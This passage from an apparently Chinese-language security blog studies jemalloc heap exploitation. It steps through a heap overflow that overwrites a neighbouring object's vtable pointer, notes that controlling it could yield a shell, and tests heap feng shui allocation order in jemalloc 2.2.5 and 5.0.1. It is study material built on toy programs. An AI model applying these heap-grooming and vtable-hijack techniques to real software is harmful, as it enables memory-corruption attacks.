<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> gcc test.c -o jemalloc -ljemalloc -g -no-pie</span><br><span class="line">➜  <span class="built_in">exp</span> ./jemalloc                                    </span><br><span class="line">padding1:	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">padding2:	BBBBBBBBBB</span><br><span class="line">[+] obj_a:	<span class="number">0x7f4b750ae000</span></span><br><span class="line">[+] obj_b:	<span class="number">0x7f4b750ae030</span></span><br><span class="line">[+] overflowing from obj_a into obj_b</span><br><span class="line">[+] derived_a: buf: <span class="number">0x7f4b750ae008</span>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBB</span><br><span class="line">[<span class="number">1</span>]    <span class="number">7331</span> segmentation fault  ./jemalloc</span><br></pre></td></tr></table></figure>
<ul>
<li>derived_b 的 print 一执行就直接报错了，很有可能是虚表的问题</li>
</ul>
<p>接下来就进行单步调试：</p>
<p>断点一，“new derived_a” 执行前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x4011eb</span> &lt;main+<span class="number">21</span>&gt;    mov    rax, qword ptr fs:[<span class="number">0x28</span>]</span><br><span class="line">  <span class="number">0x4011f4</span> &lt;main+<span class="number">30</span>&gt;    mov    qword ptr [rbp - <span class="number">0x18</span>], rax</span><br><span class="line">  <span class="number">0x4011f8</span> &lt;main+<span class="number">34</span>&gt;    <span class="keyword">xor</span>    eax, eax</span><br><span class="line">  <span class="number">0x4011fa</span> &lt;main+<span class="number">36</span>&gt;    mov    edi, <span class="number">0x28</span></span><br><span class="line">► <span class="number">0x4011ff</span> &lt;main+<span class="number">41</span>&gt;    call   <span class="number">0x4010a0</span>                      &lt;<span class="number">0x4010a0</span>&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个 “0x4010a0” 就是 new 的 PLT 表地址</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg  <span class="number">0x4010a0</span></span><br><span class="line"><span class="number">0x4010a0</span> &lt;<span class="function"><span class="keyword">operator</span> <span class="title">new</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span>)</span>@plt&gt;:	0x7525fff2fa1e0ff3	0x0000441f0f00002f</span></span><br><span class="line"><span class="function">0x4010b0 &lt;<span class="built_in">memset</span>@plt&gt;:	0x6d25fff2fa1e0ff3	0x0000441f0f00002f</span></span><br><span class="line"><span class="function">0x4010c0 &lt;<span class="built_in">strcpy</span>@plt&gt;:	0x6525fff2fa1e0ff3	0x0000441f0f00002f</span></span><br></pre></td></tr></table></figure>
<ul>
<li>调用 “0x4010a0” 前，需要把 “它将要创建的对象的大小” 作为参数，即 0x28 字节（buf[32]+VPTR）</li>
<li>可以发现：buf[32] 和 VPTR 是连续的，完全可以把 buf 中的数据溢出到 VPTR 中</li>
</ul>
<p>断点二，“obj_a-&gt;copy(padding1)” 执行前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x4012c4</span> &lt;main+<span class="number">238</span>&gt;    lea    rdx, [rbp - <span class="number">0x50</span>]</span><br><span class="line">  <span class="number">0x4012c8</span> &lt;main+<span class="number">242</span>&gt;    mov    rax, qword ptr [rbp - <span class="number">0x70</span>]</span><br><span class="line">  <span class="number">0x4012cc</span> &lt;main+<span class="number">246</span>&gt;    mov    rsi, rdx</span><br><span class="line">  <span class="number">0x4012cf</span> &lt;main+<span class="number">249</span>&gt;    mov    rdi, rax</span><br><span class="line">► <span class="number">0x4012d2</span> &lt;main+<span class="number">252</span>&gt;    call   <span class="number">0x401330</span>                      &lt;<span class="number">0x401330</span>&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个 “0x401330” 就是 base::copy() 的代码地址</li>
<li>下面是 heap 的空间排列：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x7fffffffde20</span> —▸ <span class="number">0x7ffff739d000</span> —▸ <span class="number">0x403da0</span> —▸ <span class="number">0x401396</span> (derived_a::print()) ◂— endbr64 </span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7fffffffde28</span> —▸ <span class="number">0x7ffff739d030</span> —▸ <span class="number">0x403d88</span> —▸ <span class="number">0x4013c6</span> (derived_b::print()) ◂— endbr64 </span><br></pre></td></tr></table></figure>
<ul>
<li>“0x7ffff739d000” 就是 new 为 derived_a 申请的 heap 空间：<ul>
<li>大小为 0x30（0x28：0x10字节对齐）</li>
<li>“0x403da0” 就是 derived_a 的虚表（只装有 “derived_a::print()”，以“\x00”结尾）</li>
<li>剩下的都是 buf 的空间</li>
</ul>
</li>
<li>“0x7ffff739d030” 就是 new 为 derived_b 申请的 heap 空间：<ul>
<li>大小为 0x30（0x28：0x10字节对齐）</li>
<li>“0x403d88” 就是 derived_b 的虚表（只装有 “derived_b::print()”，以“\x00”结尾）</li>
<li>剩下的都是 buf 的空间</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff739d000</span> <span class="comment">/* derived_a on heap */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│     <span class="number">0x7ffff739d000</span> —▸ <span class="number">0x403da0</span> —▸ <span class="number">0x401396</span> (derived_a::print()) ◂— endbr64 </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7ffff739d008</span> ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff739d030</span> <span class="comment">/* derived_b on heap */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rbx <span class="number">0x7ffff739d030</span> —▸ <span class="number">0x403d88</span> —▸ <span class="number">0x4013c6</span> (derived_b::print()) ◂— endbr64 </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7ffff739d038</span> ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x403da0</span> <span class="comment">/* vtable of derived_a */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x403da0</span> —▸ <span class="number">0x401396</span> (derived_a::print()) ◂— endbr64 </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x403da8</span> ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x403d88</span> <span class="comment">/* vtable of derived_b */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x403d88</span> —▸ <span class="number">0x4013c6</span> (derived_b::print()) ◂— endbr64 </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x403d90</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>断点三，“obj_a-&gt;print()” 执行前：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RDX  <span class="number">0x401396</span> (derived_a::print()) ◂— endbr64 </span><br><span class="line">    ....</span><br><span class="line">  <span class="number">0x4012f8</span> &lt;main+<span class="number">290</span>&gt;    mov    rdi, rax</span><br><span class="line">► <span class="number">0x4012fb</span> &lt;main+<span class="number">293</span>&gt;    call   rdx                           &lt;derived_a::print()&gt;</span><br><span class="line">       rdi: <span class="number">0x7ffff739d000</span> —▸ <span class="number">0x403da0</span> —▸ <span class="number">0x401396</span> (derived_a::print()) ◂— endbr64 </span><br></pre></td></tr></table></figure>
<ul>
<li>rdx 装有 “0x401396”，就是 derived_a::print() 的代码地址</li>
<li>下面是 heap 的空间排列：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff739d000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rax rdi <span class="number">0x7ffff739d000</span> —▸ <span class="number">0x403da0</span> —▸ <span class="number">0x401396</span> (derived_a::print()) ◂— endbr64 </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0x7ffff739d008</span> ◂— <span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBB&#x27;</span></span><br><span class="line">... ↓            <span class="number">5</span> skipped</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x7ffff739d038</span> ◂— <span class="string">&#x27;BBBBBBBBBB&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以发现 derived_a-&gt;buf 中溢出的数据，已经把 derived_b-&gt;VPTR 覆盖了</li>
<li>执行 derived_a::print() 时没有问题，执行 derived_b::print() 时肯定就会报错</li>
<li>如果 VPTR 被我们控制为 shellcode，就可以 get shell</li>
</ul>
<h2 id="Heap-manipulation（堆风水）"><a href="#Heap-manipulation（堆风水）" class="headerlink" title="Heap manipulation（堆风水）"></a>Heap manipulation（堆风水）</h2><p>为了能够将 jemalloc 堆安排在可预测的状态，我们需要了解分配器的行为并使用堆操作策略来影响它，使其对我们有利，堆操作策略在 Alexander Sotirov 的推广之后被称为“堆风水”</p>
<p>先看以下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TSIZE   0x10            <span class="comment">/* target size class */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NALLOC  500             <span class="comment">/* number of allocations */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFREE   (NALLOC / 10)   <span class="comment">/* number of deallocations */</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *foo[NALLOC];</span><br><span class="line">    <span class="keyword">char</span> *bar[NALLOC];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;step 1: controlled allocations of victim objects\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; NALLOC; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        foo[i] = <span class="built_in">malloc</span>(TSIZE);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foo[%d]:\t\t%p\n&quot;</span>, i, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)foo[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;-------------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;step 2: creating holes in between the victim objects\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = (NALLOC - NFREE); i &lt; NALLOC; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;freeing foo[%d]:\t%p\n&quot;</span>, i, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)foo[i]);</span><br><span class="line">        <span class="built_in">free</span>(foo[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;-------------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;step 3: fill holes with vulnerable objects\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = (NALLOC - NFREE + <span class="number">1</span>); i &lt; NALLOC; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        bar[i] = <span class="built_in">malloc</span>(TSIZE);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bar[%d]:\t%p\n&quot;</span>, i, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)bar[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;-------------------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> gcc test.c -o jemalloc -ljemalloc -g -no-pie</span><br><span class="line">➜  <span class="built_in">exp</span> ./jemalloc</span><br><span class="line">step <span class="number">1</span>: controlled allocations of victim objects</span><br><span class="line">foo[<span class="number">0</span>]:		<span class="number">0xa2ae000</span></span><br><span class="line">foo[<span class="number">1</span>]:		<span class="number">0xa2ae010</span></span><br><span class="line">foo[<span class="number">2</span>]:		<span class="number">0xa2ae020</span></span><br><span class="line">foo[<span class="number">3</span>]:		<span class="number">0xa2ae030</span></span><br><span class="line">foo[<span class="number">4</span>]:		<span class="number">0xa2ae040</span></span><br><span class="line">foo[<span class="number">5</span>]:		<span class="number">0xa2ae050</span></span><br><span class="line">foo[<span class="number">6</span>]:		<span class="number">0xa2ae060</span></span><br><span class="line">foo[<span class="number">7</span>]:		<span class="number">0xa2ae070</span></span><br><span class="line">foo[<span class="number">8</span>]:		<span class="number">0xa2ae080</span></span><br><span class="line">foo[<span class="number">9</span>]:		<span class="number">0xa2ae090</span></span><br><span class="line">foo[<span class="number">10</span>]:		<span class="number">0xa2ae0a0</span></span><br><span class="line">foo[<span class="number">11</span>]:		<span class="number">0xa2ae0b0</span></span><br><span class="line">foo[<span class="number">12</span>]:		<span class="number">0xa2ae0c0</span></span><br><span class="line">foo[<span class="number">13</span>]:		<span class="number">0xa2ae0d0</span></span><br><span class="line">foo[<span class="number">14</span>]:		<span class="number">0xa2ae0e0</span></span><br><span class="line">foo[<span class="number">15</span>]:		<span class="number">0xa2ae0f0</span></span><br><span class="line">foo[<span class="number">16</span>]:		<span class="number">0xa2ae100</span></span><br><span class="line">......</span><br><span class="line">foo[<span class="number">489</span>]:		<span class="number">0xa2afe90</span></span><br><span class="line">foo[<span class="number">490</span>]:		<span class="number">0xa2afea0</span></span><br><span class="line">foo[<span class="number">491</span>]:		<span class="number">0xa2afeb0</span></span><br><span class="line">foo[<span class="number">492</span>]:		<span class="number">0xa2afec0</span></span><br><span class="line">foo[<span class="number">493</span>]:		<span class="number">0xa2afed0</span></span><br><span class="line">foo[<span class="number">494</span>]:		<span class="number">0xa2afee0</span></span><br><span class="line">foo[<span class="number">495</span>]:		<span class="number">0xa2afef0</span></span><br><span class="line">foo[<span class="number">496</span>]:		<span class="number">0xa2aff00</span></span><br><span class="line">foo[<span class="number">497</span>]:		<span class="number">0xa2aff10</span></span><br><span class="line">foo[<span class="number">498</span>]:		<span class="number">0xa2aff20</span></span><br><span class="line">foo[<span class="number">499</span>]:		<span class="number">0xa2aff30</span></span><br><span class="line">-------------------------------------------------</span><br><span class="line">step <span class="number">2</span>: creating holes in between the victim objects</span><br><span class="line">freeing foo[<span class="number">450</span>]:	<span class="number">0xa2afc20</span></span><br><span class="line">freeing foo[<span class="number">452</span>]:	<span class="number">0xa2afc40</span></span><br><span class="line">freeing foo[<span class="number">454</span>]:	<span class="number">0xa2afc60</span></span><br><span class="line">freeing foo[<span class="number">456</span>]:	<span class="number">0xa2afc80</span></span><br><span class="line">freeing foo[<span class="number">458</span>]:	<span class="number">0xa2afca0</span></span><br><span class="line">freeing foo[<span class="number">460</span>]:	<span class="number">0xa2afcc0</span></span><br><span class="line">freeing foo[<span class="number">462</span>]:	<span class="number">0xa2afce0</span></span><br><span class="line">freeing foo[<span class="number">464</span>]:	<span class="number">0xa2afd00</span></span><br><span class="line">......</span><br><span class="line">freeing foo[<span class="number">486</span>]:	<span class="number">0xa2afe60</span></span><br><span class="line">freeing foo[<span class="number">488</span>]:	<span class="number">0xa2afe80</span></span><br><span class="line">freeing foo[<span class="number">490</span>]:	<span class="number">0xa2afea0</span></span><br><span class="line">freeing foo[<span class="number">492</span>]:	<span class="number">0xa2afec0</span></span><br><span class="line">freeing foo[<span class="number">494</span>]:	<span class="number">0xa2afee0</span></span><br><span class="line">freeing foo[<span class="number">496</span>]:	<span class="number">0xa2aff00</span></span><br><span class="line">freeing foo[<span class="number">498</span>]:	<span class="number">0xa2aff20</span></span><br><span class="line">-------------------------------------------------</span><br><span class="line">step <span class="number">3</span>: fill holes with vulnerable objects</span><br><span class="line">bar[<span class="number">451</span>]:	<span class="number">0xa2aff20</span></span><br><span class="line">bar[<span class="number">453</span>]:	<span class="number">0xa2aff00</span></span><br><span class="line">bar[<span class="number">455</span>]:	<span class="number">0xa2afee0</span></span><br><span class="line">bar[<span class="number">457</span>]:	<span class="number">0xa2afec0</span></span><br><span class="line">bar[<span class="number">459</span>]:	<span class="number">0xa2afea0</span></span><br><span class="line">bar[<span class="number">461</span>]:	<span class="number">0xa2afe80</span></span><br><span class="line">bar[<span class="number">463</span>]:	<span class="number">0xa2afe60</span></span><br><span class="line">bar[<span class="number">465</span>]:	<span class="number">0xa2afe40</span></span><br><span class="line">......</span><br><span class="line">bar[<span class="number">487</span>]:	<span class="number">0xa2afce0</span></span><br><span class="line">bar[<span class="number">489</span>]:	<span class="number">0xa2afcc0</span></span><br><span class="line">bar[<span class="number">491</span>]:	<span class="number">0xa2afca0</span></span><br><span class="line">bar[<span class="number">493</span>]:	<span class="number">0xa2afc80</span></span><br><span class="line">bar[<span class="number">495</span>]:	<span class="number">0xa2afc60</span></span><br><span class="line">bar[<span class="number">497</span>]:	<span class="number">0xa2afc40</span></span><br><span class="line">bar[<span class="number">499</span>]:	<span class="number">0xa2afc20</span></span><br><span class="line">-------------------------------------------------</span><br></pre></td></tr></table></figure>
<p>这里有很大的争议，我在网上看到了两种声音：</p>
<ul>
<li>从 5.0.1 版本的测试来看，jemalloc 采用了 LIFO 队列</li>
<li>但网上有人认为 jemalloc 采用了 FIFO 队列，从他们的数据截图来看也的确是 FIFO 队列，我猜测可能是因为 jemalloc 的版本导致了分配次序的不同</li>
</ul>
<p>最后说一下我自己的观点：（我只测试了两个版本）</p>
<p>我觉得 jemalloc-2.2.5 既不是 FIFO 也不是 LIFO，它只会在 run 所属的空间中，从低地址到高地址挨个找寻合适的 region 并分配出来</p>
<ul>
<li>以下代码可以证明：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;0&#x27;</span> * <span class="number">0x30</span>) </span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;1&#x27;</span> * <span class="number">0x30</span>) </span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;2&#x27;</span> * <span class="number">0x30</span>) </span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;3&#x27;</span> * <span class="number">0x30</span>) </span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;4&#x27;</span> * <span class="number">0x30</span>) </span><br><span class="line"></span><br><span class="line">kill(<span class="number">4</span>)</span><br><span class="line">kill(<span class="number">2</span>)</span><br><span class="line">kill(<span class="number">3</span>)</span><br><span class="line">kill(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x30</span>) </span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">0x30</span>) </span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;c&#x27;</span> * <span class="number">0x30</span>) </span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;d&#x27;</span> * <span class="number">0x30</span>) </span><br></pre></td></tr></table></figure>
<ul>
<li>结果：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x7fa34240b040</span></span><br><span class="line"><span class="number">0x7fa34240b040</span>:	<span class="number">0x3030303030303030</span>	<span class="number">0x3030303030303030</span> <span class="comment">/* 0 */</span></span><br><span class="line"><span class="number">0x7fa34240b050</span>:	<span class="number">0x3030303030303030</span>	<span class="number">0x3030303030303030</span></span><br><span class="line"><span class="number">0x7fa34240b060</span>:	<span class="number">0x3030303030303030</span>	<span class="number">0x3030303030303030</span></span><br><span class="line"><span class="number">0x7fa34240b070</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span> <span class="comment">/* a */</span></span><br><span class="line"><span class="number">0x7fa34240b080</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x7fa34240b090</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x7fa34240b0a0</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span> <span class="comment">/* b */</span></span><br><span class="line"><span class="number">0x7fa34240b0b0</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></span><br><span class="line"><span class="number">0x7fa34240b0c0</span>:	<span class="number">0x6262626262626262</span>	<span class="number">0x6262626262626262</span></span><br><span class="line"><span class="number">0x7fa34240b0d0</span>:	<span class="number">0x6363636363636363</span>	<span class="number">0x6363636363636363</span> <span class="comment">/* c */</span></span><br><span class="line"><span class="number">0x7fa34240b0e0</span>:	<span class="number">0x6363636363636363</span>	<span class="number">0x6363636363636363</span></span><br><span class="line"><span class="number">0x7fa34240b0f0</span>:	<span class="number">0x6363636363636363</span>	<span class="number">0x6363636363636363</span></span><br><span class="line"><span class="number">0x7fa34240b100</span>:	<span class="number">0x6464646464646464</span>	<span class="number">0x6464646464646464</span> <span class="comment">/* d */</span></span><br><span class="line"><span class="number">0x7fa34240b110</span>:	<span class="number">0x6464646464646464</span>	<span class="number">0x6464646464646464</span></span><br><span class="line"><span class="number">0x7fa34240b120</span>:	<span class="number">0x6464646464646464</span>	<span class="number">0x6464646464646464</span></span><br></pre></td></tr></table></figure>
<ul>
<li>我还尝试了其他的组合，不管释放的顺序如何改变，“a，b，c，d” 的顺序是不变的</li>
<li>也就是说，jemalloc-2.2.5 的释放和链表没有关系，分配时，就是从低地址到高地址遍历就行了</li>
</ul>
<p>而 jemalloc-5.0.1 的确是 LIFO 队列，空闲 region 可能是用链表组织起来的</p>
<ul>
<li>以下代码可以证明：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TSIZE   0x10            <span class="comment">/* target size class */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NALLOC  10             <span class="comment">/* number of allocations */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NFREE   (NALLOC / 10)   <span class="comment">/* number of deallocations */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jemalloc/jemalloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *foo[NALLOC];</span><br><span class="line">    <span class="keyword">char</span> *bar[NALLOC];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;step 1: controlled allocations of victim objects\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; NALLOC; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        foo[i] = <span class="built_in">malloc</span>(TSIZE);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;foo[%d]:\t\t%p\n&quot;</span>, i, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)foo[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span 